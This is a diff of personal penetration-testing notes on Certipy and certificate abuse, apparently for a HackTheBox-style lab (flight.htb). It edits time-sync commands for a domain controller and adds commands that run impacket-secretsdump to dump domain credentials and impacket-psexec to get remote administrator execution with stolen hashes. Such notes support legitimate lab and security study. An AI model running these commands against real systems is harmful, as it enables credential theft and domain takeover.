@@ -2,13 +2,13 @@ Using Certipy
 ---
 #certipy #Certificate-Abuse
 
-First sync time to DC:
+First sync time to DC (in case of time skew):
 ```shell
 sudo rdate -n $DCNAME
 ```
 OR
 ```shell
-sudo ntpdate $DCNAME
+sudo ntpdate -s $DCNAME
 ```
 and then restore
 ```shell
@@ -118,8 +118,10 @@ pip install minikerberos --user
 minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
 ```
 
-```
+```sh
+#fix time skew first!
 impacket-secretsdump -k -no-pass g0.$DOMAIN
+impacket-psexec administrator@flight.htb -hashes $HASHES
 ```
 
 Check with:
